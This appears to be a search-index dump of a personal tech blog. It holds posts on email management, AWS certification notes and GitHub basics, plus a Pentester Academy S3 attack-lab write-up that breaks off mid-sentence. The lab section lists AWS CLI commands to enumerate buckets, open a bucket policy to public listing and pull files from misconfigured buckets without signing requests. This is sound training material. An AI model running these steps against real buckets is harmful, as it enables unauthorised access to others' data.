users) One Drive 5 GB 5 (Highest capacity for India) DigiBoxx (for India) 20 GB The above table is not exhaustive of all platforms and may contain outdated information depending on when the blog post is being read.Conclusive ConsiderationIn conclusion, to avoid digital clutter and confusion, keep the following two things in mind → Media is best maintained locally or in a paid cloud photos storage platform Documents should always be storage in cloud for security, availability and accessibility" }, { "title": "Effective Email Management - Inbox Zero", "url": "/blog/posts/newbified-effective-email-management/", "categories": "Computers Newbified", "tags": "email, inbox-zero, productivity", "date": "2022-09-07 15:00:00 -0400", "snippet": "Following is a post on achieving perfect email management. All ideas and thoughts here are the way I personally implement my own email management system. There might be other methods or ideas by ot...", "content": "Following is a post on achieving perfect email management. All ideas and thoughts here are the way I personally implement my own email management system. There might be other methods or ideas by other productivity gurus out there which may work better depending on specific use cases. However, the following is what I find to be easy to implement and effective in results.Email ApplicationsMost used email applicationsThe most commonly used email management applications are as follows → Gmail by Google Outlook by Microsoft Protonmail by Proton Email aggregator applications such as Spark by Readdle or BlueMailCommonalities among email management applicationsThe aforementioned applications provide the following basic functionalities → Compose a rich text or a plain text email Provide CC (carbon copy) and BCC (blind carbon copy) fields for recipients Maintain single or multiple mailboxes as a collection of email conversations Send files of sizes up to 25 MB directly and those greater than 25 MB via cloud storage links (keep in mind these consume your own free quota of cloud storage) Provide a means for newsletters and notifications (also a big source of spam emails)The basic feature of an email is to have an email address and a platform to communicate on. Think of it like WhatsApp or iMessage or Telegram, because it is technically just that. Those instant messaging applications are just a more user-friendly variant of email through and through.How should you treat an email inboxAn email inbox must be treated like a list of things that are pending to look at, or a list of things that are currently ongoing such as emails that you’re waiting for a reply on.Everything that doesn’t qualify as the above must be either deleted or archived (a formal process defined soon). That would help achieve the concept of Inbox Zero, which is aimed at maintaining a clutter-free and well-organized email inbox. DO NOT treat your inbox like a dustbin that stores everything unnecessarily. Important things must be transferred and filed away in your cloud storage. Unimportant things such as newsletters and spam must be removedAchieving Inbox ZeroInbox Zero requires just one thing → Regular review - this can be done at any cadence depending on the number of (worthwhile or non-spam) emails that you receive. Example → review daily if you get approximately 20 emails a day, or weekly if you get that many in a week. The regular review is not the same as incident-based review which means if you get an email notification that you need to review immediately, you take action then and ignore the other pile of unread emails which you’ll look at during your regular review.Usually email providers have amazing search functionalities which use machine learning to provide best results, which means there is generally no need to maintain separate buckets or categories of emails using folders (labels in Gmail). If at all necessary to maintain categories, do not maintain more than 4 or 5, otherwise it may become hard to manage. Example categories can be as follows → Finances → Store finance related emails or conversations such as dispute logs Receipts → Store text receipts of important purchased goods Work → Store conversations or information pertaining to your primary line of work only (Optional) Secondary Work → Related to your other lines of work (optional) People → Conversations with people in everyday life (just like instant message chats) Archive → Store everything that you might need to refer at some point in the futureThe simplest (and recommended) way to maintain an Inbox Zero state is by just keeping the main inbox and an archive. The idea is, if anything is important or needs referring back at any point in the future, it should be archived after the necessary action. This should not include documents, which need to be stored in the cloud because storing documents in email consumes unnecessary cloud space, especially in Google Drive. If it isn’t important, it must be deleted. The inbox can be used as sort of a task list of whatever is pending, however, it is ESSENTIAL that you definitely review all items during your regular review.The following flow chart can help with a decision process →flowchart LRreview(\"Regular or\\nImmediate\\nReview\")actionTake required\\nactionsavedocSave document\\nto cloudarchive([\"Archive Email\"])delete([\"Delete Email\"])review --&gt; actionaction --&gt; pending{\"Pending\\ndecision?\"}pending --YES--&gt; reviewpending --NO--&gt; document{\"Is it a\\ndocument?\"}document --YES--&gt; referlater{Needs future\\nreference?}document --NO--&gt; referlatere{Needs future\\nreference?}referlatere --NO--&gt; deletereferlater --NO--&gt; deletereferlatere --YES--&gt; archivereferlater --YES--&gt; savedocIf you want to maintain the highest level of cleanliness, you could also setup a reminder to clear all archive emails older than 10 months once every quarter. But this is optional.Bonus: Self-BCC TrickIn most email providers, when we send an email to someone, it goes into sent email. With Inbox Zero, it would not look cluttered to have that email listed in the inbox. Therefore, a simple trick to push the email to inbox is to add your own email in the BCC field, which essentially means sending an email to yourself. With this trick a sent email, especially one which you do not expect a reply to, will appear in the inbox for you to follow up on or use as a reminder for yourself during the next review cycle." }, { "title": "AWS Certified Solutions Architect - Associate Notes", "url": "/blog/posts/aws-saa-notes/", "categories": "Cloud", "tags": "aws, solutions-architect-associate, course", "date": "2022-07-23 15:00:00 -0400", "snippet": "AWS Certified Solutions Architect - Associate NotesThe sections here are based on the course by ACloudGuru, and the notes list the most important points I learned overall for the CSAA certification...", "content": "AWS Certified Solutions Architect - Associate NotesThe sections here are based on the course by ACloudGuru, and the notes list the most important points I learned overall for the CSAA certification, as well as some based on practice of incorrect mock questions.AWS Fundamentals Encryption is shared between AWS and customer for the Shared Responsibility Model. The Well Architected Framework consists of 5 pillars → Operational excellence Performance efficiency Security Cost optimization Reliability IAM (Identity and Access Management) Add an Admin Group and make user accounts for supposed administrators. Add these to the group to make them administrators. IAM is universal and not regional. IAM users created first have no permissions. Policies can be assigned to users, groups, roles which are called identity based policies and they can be managed (AWS or customer) or inline (attached directly to identities). Another type of policies is resource based policies which are attached to a resource such as bucket policy Resource based policies are inline policies and there are no managed resource based policies. If a resource based policy needs to be added to allow a principal from a different account, specifying that principal in the policy is just half the work; an identity based policy must be applied to the principal in the other account to grant access to the resource. An IAM role is an identity and a resource which supports a resource based policy. Identity based policy on a role can define what access that role has while the resource based policy (role trust policy) defines who can assume that role (access that resource). Access Control Lists (ACL) is the only type of policy that does not use JSON format and is supported by only certain services like S3, WAF and VPC. Service Control Policies (SCPs) can be applied to any or all entities of accounts within an organization or organizational unit (OU), including the root user in each account.S3 (Simple Storage Service) S3 scales automatically with demand. An S3 URL is of the form → https://bucket-name.s3.region.amazonaws.com/key-name where key-name is basically the filename. Versioning cannot be disabled once enabled and a deleted (versioned) object can be restored by removing the delete marker. S3 Replication does not replicate existing objects or delete markers by default. S3 Object Lock can store objects using a WORM (write once read many) model, which has following modes. Governance mode when specific users can overwrite or delete an object version. Compliance mode when an object version cannot be modified by any user, including root. In S3 Object Lock, Retention Period dictates when the protections expire, while Legal Hold allows protections until someone revokes them. WORM in Glacier is via S3 Glacier Vault Lock, which uses compliance mode via a vault lock policy i.e., once locked, the policy cannot be modified. S3 is encrypted in transit using TLS while there are 3 modes for server side encryption (SSE) at rest → SSE-S3 (uses AES-256) where Amazon handles everything. SSE-KMS (uses KMS to store encryption keys). SSE-C (uses customer managed keys to encrypt data). Client Side Encryption (before uploading to S3) is enforced with a bucket policy that denies requests without x-amz-server-side-encryption header. Using multiple prefixes (path without object name) improves performance on S3. Cost-wise S3 storage classes are as follows → Standard Intelligent tiering Standard IA One-Zone IA Glacier Instant Retrieval Glacier Flexible Retrieval Glacier Deep Archive S3 storage classes have minimum duration limits to keep the objects in storage, which start with 30 days for IA based classes and goes up gradually till Glacier (≥ 120 days). If data is needed to be archived for cheap as well as needs to be infrequently accessed rapidly upon request, the most cost effective way is S3 Glacier Instant Retrieval.EC2 (Elastic Compute Cloud) In a Security Group, all inbound traffic is blocked by default and all outbound traffic is allowed by default. Three different networking devices → ENI (Elastic Network Interface) is for basic networking, the default option and is lowest in cost. Enhanced Networking is for requirement of high throughput. EFA (Elastic Fabric Adapter) is used to accelerate HPC and ML stuff and for an OS-level bypass. Placement Groups are a logical grouping of instances → Cluster PG is used for low latency and high throughput but cannot span multiple AZs (both of the remaining ones can). Spread PG is used when instances that need to be on different underlying hardware. Partition PG is used when set of instances are to be put in a given partition for compliance needs or hadoop based stuff. Instances can be moved into a PG but they need to be stopped first. Spot instances can be blocked from terminating for 1-6 hours using Spot Block. Spot Fleet is a collection of Spot instances as well as On-Demand instances (optional). AWS Quotas are region specific unless explicitly specified and EC2 instances have a vCPU based limit for On-Demand instances. Hot attach means when it’s running, warm attach is when it’s stopped and cold attach is when the instance is being launched.Storage Services Volumes are on EBS while Snapshots are on S3. Snapshots can be shared to other accounts and in other regions, but they need to be copied to the other region first. EBS volume type and its size can be modified on the fly. Instance Store Volumes are basically ephemeral storage and provide high random I/O as they are physically attached to the host machines. Instance Store Volumes and EBS Volumes will both retain data after a reboot, but Instance Store Volumes cannot be stopped or they will loose data. By default both EBS and Instance Store root volumes will be deleted on termination but for EBS, EC2 can be instructed to keep the root volume. To encrypt an unencrypted volume → Create a snapshot of the root volume, then create a copy of the snapshot while selecting the encrypt option. Then create an AMI from the snapshot and use that to launch new encrypted instances. Instances cannot be hibernated for more than 60 days. EFS supports many concurrent connections and is on-demand priced for the used storage; it is mainly for Linux. In EFS, data is stored across multiple AZs in a region, and can scale up to Petabytes. FSx for Windows is a centralized storage for Windows applications. FSx for Lustre is for high speed things like HPC; it can also store data directly into S3. AWS Backup is used for backing up AWS services like EC2, EBS, EFS, FSx for Lustre, AWS Storage Gateway and FSx for Windows. AWS Backup provides central control over backups, across Organizations as well. Point in time snapshots in EBS are faster than uploading data to S3 even though snapshots are stored in S3. Instance Store Volumes are needed for high performance drive operations like local cache on instances. When an AMI is copied from region A into region B, it automatically creates a snapshot in region B because AMIs are based on the underlying snapshots. Encryption of data before writing to disk can be done by AWS KMS. EBS encryption can encrypt data but only after it is written to disk.Databases RDS is for OLTP (transactional processing) and not for OLAP (analytical processing), which requires Redshift, etc. Read Replica is primarily for scaling read performance and not for DR and can be in the same AZ, cross-AZ or cross-region. Read Replicas requires automatic backups to be enabled and multiple read replicas can exist. Multi-AZ is only for DR where an exact copy of the DB is in another AZ. If there is a failure, RDS will automatically failover to standby instance. When a Multi-AZ RDS is provisioned, it automatically and synchronously replicates data to a read replica in a different AZ. AZ outage, primary DB failure, change of server type, DB OS software patching and manual failover using Reboot are reasons which cause a failover. Aurora has a minimum of 2 copies in each AZ and a minimum of 3 AZs. Aurora has automatic backups enabled by default. DynamoDB is spread across 3 geographically distinct data centers. DynamoDB is used for ACID (atomicity, consistency, isolation, durability) requirements across ≥1 tables within a single account and region. Throttling in DynamoDB can be solved by turning on DynamoDB AutoScaling. DynamoDB On-Demand Backup and Restore takes full backups at any time without any impact on performance and availability. DynamoDB Point in Time Recovery protects against accidental writes or deletes and can restore to any point in the last 35 days. Dynamo DB is not in-memory and needs DAX to make it so. In-memory usually is done by multipurpose/caching DBs like Redis and DAX. For anything greater than a TB in a structured DB with support for complex analytic queries and parallelization, Redshift is best suited, not RDS. Warm Standby DR strategy maintains a scaled-down fully functional version of workload but takes a bit of time for failover and scale out, while multi-site strategy is better to instantly failover (full capacity maintained) but costs more too. Multi-AZ is within a region so RDS can be used to create a cross-region read replica of database which can be promoted to primary later on. In RDS Multi-AZ, if the primary fails, the CNAME is switched from primary DB instance to the secondary. Read traffic cannot be directly redirected to a secondary AZ instance of Multi-AZ RDS, instead Read Replicas should be used. Read Replicas get information asynchronously from the database unlike synchronous in Multi-AZ. Failover for an RDS Multi-AZ database takes 1-2 minutes and is not instant. Redshift Enhanced VPC Routing allows all COPY and UNLOAD traffic between the cluster and data repositories to go through the VPC instead of through the internet, which is the default behavior.VPC (Virtual Private Cloud) 1 subnet is always in 1 AZ and doesn’t span multiple AZs. Default NACL comes with a VPC and allows all inbound and outbound traffic. Custom NACLs deny everything by default. Each subnet must be associated with a NACL. If it’s not done, it will be automatically associated with default NACL. A NACL can be associated with many subnets but a subnet can only be associated with 1 NACL at a time. VPC endpoints allow connecting to AWS services without leaving AWS internal network. Two types → interface and gateway. Gateway endpoints only support S3 and DynamoDB. Peering connects two VPCs via private IP addresses. VPC peering is not transitive in nature; if many VPCs need to be peered with a given VPC (service provider), use PrivateLink which doesn’t need peering, route tables, NAT gateways, etc. but needs an NLB on service provider VPC and network interfaces on all other VPCs. Setting up Direct Connect is much harder than setting up a VPN as Direct Connect bypasses the Internet and is a dedicated connection that takes a month to get setup. AWS Direct Connect bypasses the internet, can provide 10Gbps bandwidth and a dedicated connection to AWS private IP addresses from data center to AWS. AWS VPN on the other hand uses the Internet to provide a private connection with encryption. Default SG cannot be deleted but the rules can be changed. A subnet is classified as public if traffic is routed to an internet gateway. Transferring data over Direct Connect does not use encryption in transit, so security needs cannot be met. The default [* All Traffic Deny] rule in custom NACLs cannot be modified or removed. Setting up a Bastion Host requires its connectivity to the internet as it can’t be in a local-only network.Domains Alias record is an AWS thing and can translate naked domain name or a subdomain to ELB or S3, etc. Route53 Traffic Flow is needed for Geoproximity routing. Mutivalue Answer allows returning up to 8 healthy records and selecting randomly for serving traffic among those records.Load Balancing ALBs have listeners which check for connection requests from clients on the protocol and port configured. Rules determine how the ALB routes requests to registered targets like EC2 instances. NLB provide high performance or features that ALB doesn’t provide. To get the IP of the client, use the X-Forwarded-For header. Sticky sessions allow clients to stick to the same EC2 instance for Classic LBs. ALBs can also have sticky sessions but only for target groups and not per instance. Could instead have 1 instance per target group if really needed. De-registration delay allows the LB to keep connections open to an instance even if the instance becomes unhealthy. ALBs can route traffic to targets by inferring routes based on the private IP addresses of the instances. WAF can be added to an ALB in a VPC which has Geo-Match conditions to help block access from specific geolocations. Both ALB and NLB support dynamic port mapping.Monitoring CloudWatch can do monitoring in the best way. AWS best practices can be done using AWS Config. Basic CloudWatch metrics are gathered every 5 minutes, detailed metrics are gathered every 1 minute (it is costly). CloudWatch Logs Insights allows querying logs via SQL-like queries. Monitoring activities are the job of CloudWatch whereas CloudTrail is used for logging. Memory Utilization is not available by default in CloudWatch Metrics out of the box, but is available in a custom metric along with other similar metrics like Disk Swap, Page File, Disk Space, Log Collection. You can now turn on a trail across all regions for your AWS account. CloudTrail will deliver log files from all regions to the Amazon S3 bucket and an optional CloudWatch Logs log group you specified. Additionally, when AWS launches a new region, CloudTrail will create the same trail in the new region.Scaling and Availability Things should be highly available and cost effective; horizontal scaling is better most of the time. Switching between databases is easy in AWS for the SAA exam. Putting stuff inside an AMI instead of things like putting them in User Data is better. Always put stuff in ≥2 AZs for highly available things or auto-scaling. Steady state groups is for instances that cannot be scaled but can recover because min, max and required states are all =1. DynamoDB scaling is easily handled by AWS, but comes down to access patterns like predictable workloads can use auto-scaling method and on-demand method for the unpredictable workloads. Auto-scaling Scheduled Action or Scheduled Scaling sets the min and max to what the user wants for desired capacity and makes sure that happens when the schedule hits. Backlog per instance is a good metric to determine autoscaling of EC2. Use Auto-Scaling launch templates over launch configurations as that has more options like versioning. Adding Lifecycle Hooks to the Auto Scaling Group puts the instance into a wait state before termination. During this wait state, you can perform custom activities to retrieve critical operational data from a stateful instance. The Default Wait period is 1 hour.SQS, SNS and CloudWatch Alarms Instant or synchronous workload needs ELBs while asynchronous or acceptable delay workloads need SQS queues. SQS can duplicate messages very improbably, but generally it is the fault of misconfiguring visibility timeouts. Queues are not bidirectional, so if needed, two queues must be setup. Notifications are best delivered by SNS, which can be used with CloudWatch Alarms. SQS FIFO Queues can batched to increase performance in multiples from the default 300 messages per second. Example → batch of 10 messages per operation allows ingesting 3000 messages per second.Big Data Services Redshift is a relational DB but doesn’t replace RDS; Redshift is a single-AZ deployment and needs creation of multiple clusters manually in other AZs. EMR is made up of standard EC2 instances so spot instances or RIs can be used to save costs. Kinesis Data Streams is for real-time while Kinesis Data Firehose is for near real-time and automatic scaling with ease of use. Both SQS and Kinesis can act as queues, but Kinesis can store data for a year (unlike 14 days limit of SQS) and is also real-time. Athena is for serverless SQL and can be used to query logs in S3. Streaming data can be done using Kinesis Streams but processing those streams needs Kinesis Analytics, which supports standard SQL queries. Glue is a serverless ETL tool that can create a schema for data stored in S3 and Athena can then query it. Visualizing data can be done using QuickSight but if a third party logging service is needed, then use Elasticsearch.Serverless S3, Kinesis, EventBridge (CloudWatch Events) are all services that can kick off Lambda functions. Lambda functions can have up to 10 GB or RAM and 15 minutes of runtime; CPU scales with the RAM. Any AWS API call can be a trigger for an EventBridge rule; this is also faster than checking through CloudTrail. ECS only supports AWS and not on-premise. When you launch an Amazon ECS container instance, you have the option of passing user data to the instance. The data can be used to perform common automated configuration tasks and even run scripts when the instance boots. For Amazon ECS, the most common use cases for user data are to pass configuration information to the Docker daemon and the Amazon ECS container agent. To use Fargate, EKS or ECS must be used. Lambda Key Configuration can be used to encrypt the environment variables that can be used to change the function without deploying any code.Lambda Encryption Helpers make the function secure by allowing encryption of environment variables.Security Shield protects against layers 3 and 4 attacks only; It is free but advanced is expensive and gives 24/7 support. WAF operates at layer 7 and can block access to certain countries or IP addresses. GuardDuty uses AI to learn normal behavior in the account and alerts any abnormal behavior. GuardDuty monitors CloudTrail logs, VPC Flow logs and DNS logs; EventBridge can be used to trigger Lambda functions to address a GuardDuty alert. Macie identifies PII, HPI and PCI data in S3; it can also send alerts to EventBridge. S3 private files can be shared using Pre-signed URLs. Inspector can perform vulnerability checks on EC2 (host) or VPC (network). KMS manages creation and control of encryption keys; it can be started by creation of a CMK (customer master key). There are 3 ways to create a CMK → AWS generates within KMS HSMs Import key material from customer key management infrastructure and associate with a CMK Use key material stored and generated in an AWS CloudHSM cluster as part of custom key store feature of KMS CMK has key policy and is also controllable using IAM policies in combination with the key policy. There are also grants in combination with the key policy, which allows delegation of access as well. KMS has shared tenancy of AWS hardware, but CloudHSM is for dedicated physical hardware. Rotation of secrets in Secrets Manager rotates them once immediately. Parameter Store is used to minimize costs but can only store 10000 parameters.Automation CFN failures are usually due to unchanged AMIs in a new region, hardcoded parameters, etc. Instead, create a mapping section or store parameters in Parameter Store so there is a unique AMI value per region. AWS Elastic Beanstalk can do a whole lot but isn’t very robust, for which CFN is used.Caching CloudFront is the only way to add HTTPS to S3 websites. Global Accelerator allows caching of IP addresses by giving two static IP addresses to users. Redis is a caching solution and a database solution. Redis has more features than Memcached like being a data store and having backups. Memcached and DAX are not sources of truth for data.Governance Centralized logs are always preferred, whether it’s into a single bucket or within a single account. Any rules to be setup for compliance, can be done through AWS Config. Automation Documents can be used within Config to automatically remediate problems. Config can be used to see what has changed with a history of such changes within the architecture. Use AWS SSO (or with AD and other type of options) for external users and Cognito for internal users. Use Managed Microsoft AD when solutions need to be migrated to the cloud and AD Connector if the AD is staying On-Premises. Shutting down services or instances to save cost should be always done using Lambda or Automation Documents. Trusted Advisor is free, but advanced checks are paid; it is only for auditing and cannot fix things. A solution to fixing stuff is using EventBridge and trigger Lambda functions to fix problems.Data Migration Snowball is used used for TB-scale migration. It also has encryption by default. Storage Gateway is run locally as a VM. DataSync is an agent based solution and it is only for one time migration unlike Storage Gateway. DataSync can send data to EFS and FSx. Transfer Family allows legacy applications of (S)FTP(S). Database Migration Service is to migrate DB with schema conversion from Oracle or SQL to any other database system. Server Migration Service is used to migrate VMs." }, { "title": "Fundamentals of GitHub", "url": "/blog/posts/github-fundamentals/", "categories": "Computers and Fun", "tags": "github, open-source", "date": "2022-05-01 08:00:00 -0400", "snippet": "IntroductionThis blog is a primer of how basic GitHub collaboration works. This is not exhaustive of all features and tidbits but a basic explanation sheet to help people work on GitHub with relati...", "content": "IntroductionThis blog is a primer of how basic GitHub collaboration works. This is not exhaustive of all features and tidbits but a basic explanation sheet to help people work on GitHub with relative comfort and ease.GitHub allows you to host code with version control and the functionality to collaborate. Code is stored in a Repository where updates to the codebase are added as commits and feature sets are organized into branches.The image above shows a workflow cycle for a single repository. The repository storage on GitHub (github.com) is called origin. This code can be pulled down to a local workstation where changes are added and committed. The changes are then pushed to GitHub.The browser version of GitHub allows launching a VS Code instance on the web by pressing . on the repository page. This launches it in github.dev which is a great place to make commits to code. New changes can be pushed to a branch by many people who have access to it. These can be pulled down to local workstations to work on the latest version of the code.The same process can be replicated for branches other than main as well. The idea of branches is that you work on a feature set for your codebase in a branch say feature_x and when all changes are stable and working, the branch can be merged with the main branch, which is seen as a “final” place for code, so to say.Working on a GitHub RepositoryGeneral Workflow A repository can be cloned to a local machine using → git clone [repository link] A look at current status i.e., files staged for commits, current changes, etc. → git status Add changed files to be committed → git add [file_list] or add the entire directory using git add . Commit currently added changes with a message → git commit -m \"[description]\" Push all local commits to origin → git push or git push origin main Pull changes from origin → git pull or git pull origin master To check the log of commits so far in a repository → git log or git log -n 5 to limit to 5 latest commits To reset the local clone to the last commit and discard all changes → git reset --hard (! this can discard hard work so be careful)Similar operations can be done via the GUI or GitHub Dev as well.BranchesBranches are used to separate out features and prevent changes from causing disruptions in the main branch. Some operations for branches are as follows → Make a new branch and switch to it → git branch &lt;branch_name&gt; &amp;&amp; git checkout &lt;branch_name&gt; or git checkout -b &lt;branch_name&gt; List all branches in the local repository → git branch or include remote branches too using git branch -a To delete a branch, use command → git branch -d &lt;branch_name&gt;To switch to another branch from current branch with uncommitted changes, push the changes on a stack and pop with it to get the changes back (to be done in the correct branch only) → git stash followed by git stash pop.Merging via Pull RequestsA non-main branch can be merged into a main branch via something called a Pull Request (PR). A usual scenario is something as follows → A repository maintains code for a n expense tracker software with the main code within the main branch There is a feature to add budgeting as a feature in the branch budget When the feature set is ready, the code needs to be merged into the main branch so that users of the application can make use of it A PR can be opened to merge the code from the budget branch into main, the easiest way being to open it from the website A PR is called a “pull” request because it’s meant to signify the fact that the branch is asking main to pull from it!A usual problem that may arise when merging code is a Merge Conflict. Generally, when a branch is created, it is a bifurcation from the main branch with the same code. If somebody changes the code in the main branch and the same code is also modified in a branch, then a PR from that branch would result in a merge conflict because GitHub isn’t sure which version of the code is more up to date. The visual representation of PRs is as follows →A merge conflict is represented by GitHub as follows →&lt;&lt;&lt;&lt;&lt;&lt;&lt; HEADconflict code=======branch code&gt;&gt;&gt;&gt;&gt;&gt;&gt; 445486de81907127c9f1d611ee10d90480f965e6The =’s are a separator. The last string is the commit ID of the most recent change. To solve the merge conflict, all separators along with the non-essential code must be removed. It’s always better to commit small changes to branches and build branches for smaller feature sets to avoid conflicts and difficulties in reviews.Contributing to Other ReposContributing is generally the same, whether it is within a repository owned by a single person, a repository with collaboration among several people or a repository within an organization. Everything is meant to done via Pull Requests.For contributing to a public repository, say pub_repo by maintainer pub_maintain, the following workflow is generally sufficient → Make a fork of the pub_repo, which means essentially copying the code over from pub_maintain’s code storage to your own code storage. This can be done via the GUI and GitHub is generally smart enough to carry information about the upstream or pub_repo along with it. At this point, origin is your own copy of pub_repo and upstream is pub_maintain’s copy of pub_repo. To add a feature to pub_repo, make the changes in origin and then open a PR to upstream. origin is technically the state in a local workstation clone while remote origin is the state on github.com. But, to abstract away the interaction between local clone and github.com, it’s easier to just refer to it as origin.The above workflow will open a PR from origin’s main branch to remote origin ‘s main branch. But of course, PRs can be from any branch to any other branch.To fetch changes from the upstream, use git fetch upstream. If the clone state does not have information about upstream, add that information using → git remote add upstream &lt;https://github.com/&gt;&lt;user&gt;/&lt;repo&gt;.git, where user should be pub_maintain.The workflow for contribution is essentially the same when done within an organization or a group of individuals maintaining a repository, just a bit of a difference which is that it’s generally between branches like maintaining a personal repository.PR ReviewsA really important aspect of PRs is Reviews. When contributing to a repository, specially when it’s within a group or an organization, it is important to make sure that the changes within a PR are actually intended, valid and non-breaking. So, the idea is that other maintainers, collaborators or developers possibly with higher access levels to the repository will review the changes and approve those.GitHub can be configured to require x number of approvals before merging a PR. A reviewer can suggest changes or approve the PR. When all parties are satisfied, the PR can be merged and the new code that lands would likely not break anything.As a bonus, if you review code, try to make suggestions using the GitHub UI’s suggestion button when adding a review comment. In MD syntax, it looks like the following →~~~suggestioncode line(s)~~~This allows the other person to batch all commit suggestions into a single commit and make the changes faster rather than manually changing as per all suggestions.CI/CD - GitHub ActionsCI/CD can be performed on a repository in GitHub using GitHub Actions. There are different requirements for running these workloads, but the free tier usually suffices for general software/code.For example, a CI workflow can be defined by adding a yaml file to the .github/workflows directory in the root location for the repository. One such workflow from my containerized-security-toolkit repository is as follows →name: Security Imageon: push: branches: - 'main' schedule: - cron: '0 0 15 * *' workflow_dispatch: inputs: tags: description: 'run' required: false type: booleanjobs: docker: runs-on: ubuntu-latest steps: - name: Checkout uses: actions/checkout@v2 - name: Docker Login uses: docker/login-action@v1.10.0 with: username: tanq16 password: $ - name: Build and push security docker uses: docker/build-push-action@v2 with: context: security_docker push: true tags: tanq16/sec_docker:main The on defines the events which trigger the workflow. In this case, every commit on the main branch and the cron job of every 1st, 14th and 28th day of the month triggers the workflow. The jobs define the actual commands/actions that are executed in the workflow. The uses defines a public action that is inherited to run in the current workflow. Alternatively, the run can be used to define exact commands that need to be run in the CI environment. Multiple actions/commands can be defined within the steps to denote the serial execution of them in the given order.Another example of GHA in use is when GitHub Pages is enabled on a repository. Many Jekyll site generator themes also have good CI/CD workflows within their respective repositories." }, { "title": "Pentester Academy AWS S3 Attack Lab", "url": "/blog/posts/pentester-academy-aws-s3/", "categories": "Lab Practice Notes, AWS Labs", "tags": "aws, lab, pentester-academy, s3, security", "date": "2022-04-28 03:00:00 -0400", "snippet": "Enumeration List buckets and get region for bucket → # List buckets using s3api awsn s3api list-buckets | jq '.Buckets[] | .Name' | tr -d \"\\\"\" # Get region for bucket awsn s3api get-bucket...", "content": "Enumeration List buckets and get region for bucket → # List buckets using s3api awsn s3api list-buckets | jq '.Buckets[] | .Name' | tr -d \"\\\"\" # Get region for bucket awsn s3api get-bucket-location --bucket insecurecorp-code | jq '.LocationConstraint' Get versioning for buckets → # For a single bucket awsn s3api get-bucket-versioning --bucket data-extractor-repo | jq '.Status' | tr -d \"\\\"\" # Get names of buckets with versioning enabled for i in $(awsn s3api list-buckets | jq '.Buckets[] | .Name' | tr -d \"\\\"\"); do if [[ $(awsn s3api get-bucket-versioning --bucket $i 2&gt;/dev/null | jq '.Status' | tr -d \"\\\"\") == \"Enabled\" ]] then echo $i; fi; done List objects and versions in a bucket → # List objects in a bucket awsn s3api list-objects --bucket data-extractor-repo # List object versions # Prefix will match the given string from the beginning of objects # It can be used with a Delimiter so that everything starting with prefix up to # the delimiter is matched and returned awsn s3api list-object-versions --bucket data-extractor-repo --prefix index.html Get special information on bucket → # Know if bucket is public or not awsn s3api get-public-access-block --bucket insecurecorp-code # Get policy for bucket awsn s3api get-bucket-policy --bucket insecurecorp-code --output text | jq # Get ACL for bucket awsn s3api get-bucket-acl --bucket insecurecorp-code # Get Logging information for bucket awsn s3api get-bucket-logging --bucket insecurecorp-code Basics Identify the S3 endpoint →# Identification of S3 endpoint can be done by using nmapnmap -sV 192.37.2.3This gives an output of unknown service cslistener running at port 9000 along with some HTTP type return. Using curl on this endpoint gives the following →http://192.37.2.3:9000 -v* Rebuilt URL to: http://192.37.2.3:9000/* Trying 192.37.2.3...* TCP_NODELAY set* Connected to 192.37.2.3 (192.37.2.3) port 9000 (#0)&gt; GET / HTTP/1.1&gt; Host: 192.37.2.3:9000&gt; User-Agent: curl/7.58.0&gt; Accept: */*&gt;&lt; HTTP/1.1 403 Forbidden&lt; Accept-Ranges: bytes&lt; Content-Length: 226&lt; Content-Security-Policy: block-all-mixed-content&lt; Content-Type: application/xml&lt; Server: MinIO/RELEASE.2019-09-05T23-24-38Z&lt; Vary: Origin&lt; X-Amz-Request-Id: 16E69AAC117238E7&lt; X-Xss-Protection: 1; mode=block&lt; Date: Sun, 17 Apr 2022 06:19:37 GMT&lt;&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;* Connection #0 to host 192.37.2.3 left intact&lt;Error&gt;&lt;Code&gt;AccessDenied&lt;/Code&gt;&lt;Message&gt;Access Denied.&lt;/Message&gt;&lt;Resource&gt;/&lt;/Resource&gt;&lt;RequestId&gt;16E69AAC117238E7&lt;/RequestId&gt;&lt;HostId&gt;49db7dfe-bdf5-4b2b-bbba-7e3fb2d7e1a3&lt;/HostId&gt;&lt;/Error&gt;The headers contain X-Amz-Request-Id which signifies that the resource is an Amazon service and the server can be seen as Minio which is an open source S3 service. List all buckets owned by the current user and the contents of the hello-world bucket →# Using the endpoint flag to specify a specific endpointaws --endpoint http://192.37.2.3:9000 s3api list-buckets# List the objects within the hello-world bucketaws --endpoint http://192.37.2.3:9000 s3api list-objects --bucket hello-world Get the objects from the hello-world bucket to retrieve the flag →# The key can be mentioned to retrieve specific objects and the next argument is the outfileaws --endpoint http://192.37.2.3:9000 s3api get-object --key flag flag --bucket hello-world Put a file into the bucket →# Make a new fileecho \"hello-world\" &gt; file# Upload to the bucketaws --endpoint http://192.37.2.3:9000 s3api put-object --key file --body file --bucket hello-world# Can also use s3 cp command# Using the s3api command without body flag will make an object of size 0 bytes Check permissions to retrieve objects from bucket welcome →$ aws --endpoint http://192.37.2.3:9000 s3api get-bucket-policy --bucket welcome --output text | python3 -m json.tool{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AddPerm\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": [ \"*\" ] }, \"Action\": [ \"s3:GetObject\" ], \"Resource\": [ \"arn:aws:s3:::welcome/*\" ] } ]}This means that anyone can retrieve objects from the bucket but NOT list them as s3:ListBucket is not present. Modify policy of welcome bucket to allow listing by anyone →$ cat &gt; policy.json{ \"Version\": \"2012-10-17\", \"Statement\": [ { \"Sid\": \"AddPerm\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": [ \"*\" ] }, \"Action\": [ \"s3:GetObject\" ], \"Resource\": [ \"arn:aws:s3:::welcome/*\" ] }, { \"Sid\": \"Addednew\", \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"*\" }, \"Action\": \"s3:ListBucket\", \"Resource\": [ \"arn:aws:s3:::welcome\" ] } ]}# Add the policy to the bucketaws --endpoint http://192.37.2.3:9000 s3api put-bucket-policy --policy file://policy.json --bucket welcomeThe objects can be listed now from http://192.37.2.3:9000/welcome using curl. Delete an object from the hello-world bucket →aws --endpoint http://192.37.2.3:9000 s3api delete-object --key \"welcome\" --bucket hello-worldSensitive Data ExposureThe Lab exposes a URL → https://uyphi3oonj.execute-api.ap-southeast-1.amazonaws.com/defaultThe page loads static contents from an S3 bucket. This gives the name of the bucket as lab-webapp-static-resources. Enumerating objects by public permissions →aws s3 cp s3://lab-webapp-static-resources/scripts/backup.sh ./backup.sh --no-sign-requestThe backup file contains a 